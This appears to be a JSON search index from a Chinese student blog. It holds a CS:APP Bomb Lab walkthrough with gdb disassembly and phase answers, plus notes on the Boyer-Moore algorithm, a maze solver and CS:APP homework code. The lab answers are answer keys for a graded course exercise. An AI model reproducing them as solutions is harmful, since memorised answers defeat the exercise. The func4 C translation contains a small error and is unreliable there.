\u003c+44\u003e: jmp 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fc6 \u003c+46\u003e: mov $0x0,%eax 0x0000000000400fcb \u003c+51\u003e: pop %rbx 0x0000000000400fcc \u003c+52\u003e: pop %rbp 0x0000000000400fcd \u003c+53\u003e: pop %r12 0x0000000000400fcf \u003c+55\u003e: retq End of assembler dump. 此函数等价于下面的 c 代码 int func4(int a, int b) { if(a \u003c= 0) return 0; if(a == 1) return b; return b + func4(a - 1, b) + func4(n - 2, b); } 穷举 2-4 的值即可得到答案,取答案为 176 2 ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:5","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_5 (gdb) disas phase_5 Dump of assembler code for function phase_5: 0x0000000000401021 \u003c+0\u003e: push %rbx 0x0000000000401022 \u003c+1\u003e: mov %rdi,%rbx 0x0000000000401025 \u003c+4\u003e: callq 0x401261 \u003cstring_length\u003e 0x000000000040102a \u003c+9\u003e: cmp $0x6,%eax 0x000000000040102d \u003c+12\u003e: je 0x401034 \u003cphase_5+19\u003e 0x000000000040102f \u003c+14\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401034 \u003c+19\u003e: mov $0x0,%eax 0x0000000000401039 \u003c+24\u003e: mov $0x0,%edx 0x000000000040103e \u003c+29\u003e: movzbl (%rbx,%rax,1),%ecx 0x0000000000401042 \u003c+33\u003e: and $0xf,%ecx 0x0000000000401045 \u003c+36\u003e: add 0x402540(,%rcx,4),%edx 0x000000000040104c \u003c+43\u003e: add $0x1,%rax 0x0000000000401050 \u003c+47\u003e: cmp $0x6,%rax 0x0000000000401054 \u003c+51\u003e: jne 0x40103e \u003cphase_5+29\u003e 0x0000000000401056 \u003c+53\u003e: cmp $0x27,%edx 0x0000000000401059 \u003c+56\u003e: je 0x401060 \u003cphase_5+63\u003e 0x000000000040105b \u003c+58\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401060 \u003c+63\u003e: pop %rbx 0x0000000000401061 \u003c+64\u003e: retq End of assembler dump. 由汇编代码可知,需要输入一个长度为 6 的字符串.令该字符串为 input,+36 处出现的 数组为 array,则该汇编等价于下面代码. for(int i = 0; i \u003c 6; i++) sum += array[ input[i] \u0026 0xf ]; 意为遍历输入字符串,取该字符串低 4 位作为 array 下标,取出 array 值相加. 查看 array 的值 (gdb) p/x *0x402540@16 $2 = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, 0xf, 0xd} 题目要求 sum = 0x27,故从 array 中选出 6 个和为 0x27 的数,通过这 6 个数的下标找出对应字符. 答案应为 01347L; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:6","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_6 因为课程未对后续两关作要求,故不做特别详细的解答. (gdb) disas phase_6 Dump of assembler code for function phase_6: 0x0000000000401062 \u003c+0\u003e: push %r13 0x0000000000401064 \u003c+2\u003e: push %r12 0x0000000000401066 \u003c+4\u003e: push %rbp 0x0000000000401067 \u003c+5\u003e: push %rbx 0x0000000000401068 \u003c+6\u003e: sub $0x58,%rsp 0x000000000040106c \u003c+10\u003e: lea 0x30(%rsp),%rsi 0x0000000000401071 \u003c+15\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000401076 \u003c+20\u003e: lea 0x30(%rsp),%r13 0x000000000040107b \u003c+25\u003e: mov $0x0,%r12d 0x0000000000401081 \u003c+31\u003e: mov %r13,%rbp 0x0000000000401084 \u003c+34\u003e: mov 0x0(%r13),%eax 0x0000000000401088 \u003c+38\u003e: sub $0x1,%eax 0x000000000040108b \u003c+41\u003e: cmp $0x5,%eax 0x000000000040108e \u003c+44\u003e: jbe 0x401095 \u003cphase_6+51\u003e 0x0000000000401090 \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401095 \u003c+51\u003e: add $0x1,%r12d 0x0000000000401099 \u003c+55\u003e: cmp $0x6,%r12d 0x000000000040109d \u003c+59\u003e: jne 0x4010a6 \u003cphase_6+68\u003e 0x000000000040109f \u003c+61\u003e: mov $0x0,%esi 0x00000000004010a4 \u003c+66\u003e: jmp 0x4010e8 \u003cphase_6+134\u003e 0x00000000004010a6 \u003c+68\u003e: mov %r12d,%ebx 0x00000000004010a9 \u003c+71\u003e: movslq %ebx,%rax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010ac \u003c+74\u003e: mov 0x30(%rsp,%rax,4),%eax 0x00000000004010b0 \u003c+78\u003e: cmp %eax,0x0(%rbp) 0x00000000004010b3 \u003c+81\u003e: jne 0x4010ba \u003cphase_6+88\u003e 0x00000000004010b5 \u003c+83\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004010ba \u003c+88\u003e: add $0x1,%ebx 0x00000000004010bd \u003c+91\u003e: cmp $0x5,%ebx 0x00000000004010c0 \u003c+94\u003e: jle 0x4010a9 \u003cphase_6+71\u003e 0x00000000004010c2 \u003c+96\u003e: add $0x4,%r13 0x00000000004010c6 \u003c+100\u003e: jmp 0x401081 \u003cphase_6+31\u003e 0x00000000004010c8 \u003c+102\u003e: mov 0x8(%rdx),%rdx 0x00000000004010cc \u003c+106\u003e: add $0x1,%eax 0x00000000004010cf \u003c+109\u003e: cmp %ecx,%eax 0x00000000004010d1 \u003c+111\u003e: jne 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010d3 \u003c+113\u003e: jmp 0x4010da \u003cphase_6+120\u003e 0x00000000004010d5 \u003c+115\u003e: mov $0x603410,%edx 0x00000000004010da \u003c+120\u003e: mov %rdx,(%rsp,%rsi,2) 0x00000000004010de \u003c+124\u003e: add $0x4,%rsi 0x00000000004010e2 \u003c+128\u003e: cmp $0x18,%rsi 0x00000000004010e6 \u003c+132\u003e: je 0x4010fd \u003cphase_6+155\u003e 0x00000000004010e8 \u003c+134\u003e: mov 0x30(%rsp,%rsi,1),%ecx 0x00000000004010ec \u003c+138\u003e: cmp $0x1,%ecx 0x00000000004010ef \u003c+141\u003e: jle 0x4010d5 \u003cphase_6+115\u003e 0x00000000004010f1 \u003c+143\u003e: mov $0x1,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010f6 \u003c+148\u003e: mov $0x603410,%edx 0x00000000004010fb \u003c+153\u003e: jmp 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010fd \u003c+155\u003e: mov (%rsp),%rbx 0x0000000000401101 \u003c+159\u003e: lea 0x8(%rsp),%rax 0x0000000000401106 \u003c+164\u003e: lea 0x30(%rsp),%rsi 0x000000000040110b \u003c+169\u003e: mov %rbx,%rcx 0x000000000040110e \u003c+172\u003e: mov (%rax),%rdx 0x0000000000401111 \u003c+175\u003e: mov %rdx,0x8(%rcx) 0x0000000000401115 \u003c+179\u003e: add $0x8,%rax 0x0000000000401119 \u003c+183\u003e: cmp %rsi,%rax 0x000000000040111c \u003c+186\u003e: je 0x401123 \u003cphase_6+193\u003e 0x000000000040111e \u003c+188\u003e: mov %rdx,%rcx 0x0000000000401121 \u003c+191\u003e: jmp 0x40110e \u003cphase_6+172\u003e 0x0000000000401123 \u003c+193\u003e: movq $0x0,0x8(%rdx) 0x000000000040112b \u003c+201\u003e: mov $0x5,%ebp 0x0000000000401130 \u003c+206\u003e: mov 0x8(%rbx),%rax 0x0000000000401134 \u003c+210\u003e: mov (%rax),%eax 0x0000000000401136 \u003c+212\u003e: cmp %eax,(%rbx) 0x0000000000401138 \u003c+214\u003e: jge 0x40113f \u003cphase_6+221\u003e 0x000000000040113a \u003c+216\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040113f \u003c+221\u003e: mov 0x8(%rbx),%rbx 0x0000000000401143 \u003c+225\u003e: sub $0x1,%ebp 0x0000000000401146 \u003c+228\u003e: jne 0x401130 \u003cphase_6+206\u003e ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000401148 \u003c+230\u003e: add $0x58,%rsp 0x000000000040114c \u003c+234\u003e: pop %rbx 0x000000000040114d \u003c+235\u003e: pop %rbp 0x000000000040114e \u003c+236\u003e: pop %r12 0x0000000000401150 \u003c+238\u003e: pop %r13 0x0000000000401152 \u003c+240\u003e: retq End of assembler dump. 汇编代码很长.其意为输入 6 个互不相等的数,介于 1-6.按这 6 个数的值从位于地址 0x603410 的链表中选出对应位置的 节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序. 查看链表的值. (gdb) p/x *(0x603410) $3 = 0x1cf (gdb) p/x *(0x603410 + 8) $4 = 0x603420 (gdb) p/x *(0x603420) $5 = 0x188 (gdb) p/x *(0x603420 + 8) $6 = 0x603430 (gdb) p/x *(0x603430) $7 = 0x1d1 (gdb) p/x *(0x603430 + 8) $8 = 0x603440 (gdb) p/x *(0x603440) $9 = 0x174 (gdb) p/x","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:7","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"secret_phase 正常通过前 6 关是无法触发 secret_phase 的,查看汇编发现,在 phase_4 答案之后输入 DrEvil 即可进入 secret_phase. (gdb) disas secret_phase Dump of assembler code for function secret_phase: 0x0000000000401191 \u003c+0\u003e: push %rbx 0x0000000000401192 \u003c+1\u003e: callq 0x40155c \u003cread_line\u003e 0x0000000000401197 \u003c+6\u003e: mov $0xa,%edx 0x000000000040119c \u003c+11\u003e: mov $0x0,%esi 0x00000000004011a1 \u003c+16\u003e: mov %rax,%rdi 0x00000000004011a4 \u003c+19\u003e: callq 0x400b80 \u003cstrtol@plt\u003e 0x00000000004011a9 \u003c+24\u003e: mov %rax,%rbx 0x00000000004011ac \u003c+27\u003e: lea -0x1(%rax),%eax 0x00000000004011af \u003c+30\u003e: cmp $0x3e8,%eax 0x00000000004011b4 \u003c+35\u003e: jbe 0x4011bb \u003csecret_phase+42\u003e 0x00000000004011b6 \u003c+37\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004011bb \u003c+42\u003e: mov %ebx,%esi 0x00000000004011bd \u003c+44\u003e: mov $0x603230,%edi 0x00000000004011c2 \u003c+49\u003e: callq 0x401153 \u003cfun7\u003e 0x00000000004011c7 \u003c+54\u003e: cmp $0x4,%eax 0x00000000004011ca \u003c+57\u003e: je 0x4011d1 \u003csecret_phase+64\u003e 0x00000000004011cc \u003c+59\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004011d1 \u003c+64\u003e: mov $0x4024d0,%edi 0x00000000004011d6 \u003c+69\u003e: callq 0x400ac0 \u003cputs@plt\u003e 0x00000000004011db \u003c+74\u003e: callq 0x401682 \u003cphase_defused\u003e 0x00000000004011e0 \u003c+79\u003e: pop %rbx 0x00000000004011e1 \u003c+80\u003e: retq ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- End of assembler dump. (gdb) disas fun7 Dump of assembler code for function fun7: 0x0000000000401153 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000401157 \u003c+4\u003e: test %rdi,%rdi 0x000000000040115a \u003c+7\u003e: je 0x401187 \u003cfun7+52\u003e 0x000000000040115c \u003c+9\u003e: mov (%rdi),%edx 0x000000000040115e \u003c+11\u003e: cmp %esi,%edx 0x0000000000401160 \u003c+13\u003e: jle 0x40116f \u003cfun7+28\u003e 0x0000000000401162 \u003c+15\u003e: mov 0x8(%rdi),%rdi 0x0000000000401166 \u003c+19\u003e: callq 0x401153 \u003cfun7\u003e 0x000000000040116b \u003c+24\u003e: add %eax,%eax 0x000000000040116d \u003c+26\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x000000000040116f \u003c+28\u003e: mov $0x0,%eax 0x0000000000401174 \u003c+33\u003e: cmp %esi,%edx 0x0000000000401176 \u003c+35\u003e: je 0x40118c \u003cfun7+57\u003e 0x0000000000401178 \u003c+37\u003e: mov 0x10(%rdi),%rdi 0x000000000040117c \u003c+41\u003e: callq 0x401153 \u003cfun7\u003e 0x0000000000401181 \u003c+46\u003e: lea 0x1(%rax,%rax,1),%eax 0x0000000000401185 \u003c+50\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x0000000000401187 \u003c+52\u003e: mov $0xffffffff,%eax 0x000000000040118c \u003c+57\u003e: add $0x8,%rsp 0x0000000000401190 \u003c+61\u003e: retq End of assembler dump. 此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数. 由节点向左为 0,由节点向右为 1,查找路径序的 0-1 列从右向左构成一个二进制数,该 二进制数的十进制值必须等于题目中提供的数,其为 4,那么所需查找路径序列为 100, 根据二叉树结构,应该查找 7,故答案为 7. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:8","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"运行截图 ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:9","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["数据结构"],"content":"设计思路 BM 算法是一种后缀匹配算法,其具有比 KMP 算法更优秀的性能表现.其核心思想有二 ,第一是坏字符,坏字符就是 pattern 与 text 从右往左第一失配的在 text 中的字符, 二是好后缀,好后缀就是 pattern 与 text 从右往左连续匹配成功的子串.对于坏字符 和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选 择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词. 每次从文档中读取一行进行匹配搜索,每次使用 BM 算法搜索完成后,若搜索到单词, 则将主串中开始匹配的位置定为查找到单词的下一行,使用 BM 算法进行下一个匹配 搜索,直至搜索完当前行.而后循环直至匹配完整个文档. ","date":"2018-12-01","objectID":"/posts/ds-bm/:1:0","tags":["串匹配"],"title":"数据结构:BM算法","uri":"/posts/ds-bm/"},{"categories":["数据结构"],"content":"代码说明 int* CreateBC(char* pattern, int len); 传入模式串及其长度,返回根据坏字符的跳转数组. int* CreateSuffix(char* pattern, int len); int* CreateGS(char* pattern, int len); 两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调 用第一个函数返回根据好后缀的跳转数组. int bm_search(char* text, int text_len, char* pattern, int pattern_len, int *bc, int *gs); 传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串 中查找到模式串的第一个位置,未查找到,则返回-1. char* get_line(FILE *article, char (\u0026text)[1000]); 从给定的 article 文件中读取最大 1000 字符的一行,存在 text 位置,读取到文件末尾 则返回 NULL. ","date":"2018-12-01","objectID":"/posts/ds-bm/:2:0","tags":["串匹配"],"title":"数据结构:BM算法","uri":"/posts/ds-bm/"},{"categories":["数据结构"],"content":"运行结果 此为从马丁路德金的 I hava a dream 演讲稿中查找 dream 得出的结果. ","date":"2018-12-01","objectID":"/posts/ds-bm/:3:0","tags":["串匹配"],"title":"数据结构:BM算法","uri":"/posts/ds-bm/"},{"categories":["数据结构"],"content":"设计思路 ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:0","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"图编号 如图所示，从上到下，从左到右，给 17 个顶点进行编号，以两个顶点代表一条边，例入 2-3 代表可以从顶点 2 走到顶点 3。问题即为求解从 2 -\u003e 17 的通路。 ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:1","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"求解思想 求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。 求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。 ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:2","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"代码说明 ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:0","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"结构体及全局变量定义 typedef struct p //表示顶点,用于寻找最短路径时记录路径 { int code; struct p* pre; //前一个顶点 } Ver; const int edge_cnt = 29; //边的数量 const int ver_cnt = 17; //顶点数量 int map[edge_cnt][2]; //记录边 int my_stack[MAX] = {0}; //数组模拟栈 int my_quque[MAX] = {0}; //数组模拟队列 int top = 0; //栈顶指示 int front = 0, rear = 0; //队列首位指示 bool visit[ver_cnt + 1] = {false}; //记录点是否访问过 Ver vers[ver_cnt + 1]; //每个点路径链表头结点 ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:1","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"函数定义 void loadmaze(); //读入迷宫地图 void visited(int i); //将点i状态置为访问过 bool isvisited(int i); //判断点i是否访问过 bool hasway(int s); //从点s出发是否有没去过的可行路径 void find_way(int start, int end); //找到一条通路 void find_least(int start, int end); //找到一条最短路径 ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:2","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"运行结果 ","date":"2018-11-10","objectID":"/posts/ds-maze/:3:0","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["数据结构"],"content":"实验总结 本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。 ","date":"2018-11-10","objectID":"/posts/ds-maze/:4:0","tags":["数据结构","迷宫问题"],"title":"数据结构:迷宫问题","uri":"/posts/ds-maze/"},{"categories":["CS:APP"],"content":"CS:APP 2.60 #include \u003cstdio.h\u003e unsigned replace_byte(unsigned x, int i, unsigned char b) { x = x \u0026 (~(0XFF \u003c\u003c (i \u003c\u003c 3)));//相应字节置零 x = x | (b \u003c\u003c (i \u003c\u003c 3)); //相应字节改为char b return x; } int main() { unsigned ret = replace_byte(0X12345678, 1, 0XAB); printf(\"0X%X\\n\", ret); return 0; } 0X1234AB78 利用按位运算$x \\\u0026 1 = x , b | 0 = b$。 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:1:0","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.65 #include \u003cstdio.h\u003e int odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; } int main() { int x = odd_ones(0XB); printf(\"%d\\n\", x); return 0; } 1 对 32 位编码，1 亦或所有 0 仍为 1，偶数个 1 连续亦或结果为 0，奇数个 1 连续亦或结果为 1。对 32 位数，按照右移 16，8，4，2，1 依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:2:0","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.67 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:0","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"A 在 int 为 w 位的机器中，移位长度不应该超过$w - 1$。 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:1","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"B #include \u003cstdio.h\u003e #include \u003climits.h\u003e int int_size_is_32() { return 1 \u003c\u003c 31 == INT_MIN; } int main() { printf(\"%d\\n\", int_size_is_32()); return 0; } 1 若 int 为 32 位,则$1 « 31 ==$ INT_MIN. ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:2","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"C #include \u003cstdio.h\u003e #include \u003climits.h\u003e int int_size_is_32_for_16() { return (1 \u003c\u003c 15 != INT_MIN) \u0026\u0026 ((1 \u003c\u003c 31) == INT_MIN); } int main() { printf(\"%d\\n\", int_size_is_32_for_16()); return 0; } 1 当$1 « 15 !=$ INT_MIN，证明 int 非 16 位后，后面即可判断 int 是否为 32 位. ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:3","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.68 #include \u003cstdio.h\u003e int lower_one_mask(int n) { return (int)(0XFFFFFFFFu \u003e\u003e (32 - n)); } int main() { printf(\"0X%X\\n\", lower_one_mask(6)); return 0; } 0X3F 将无符号 int 最大值右移$(32 - n)$位，进行了逻辑右移，再强制转换为有符号 int。 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:4:0","tags":["CS:APP"],"title":"CS:APP解题记录","uri":"/posts/csapp-problems/"}]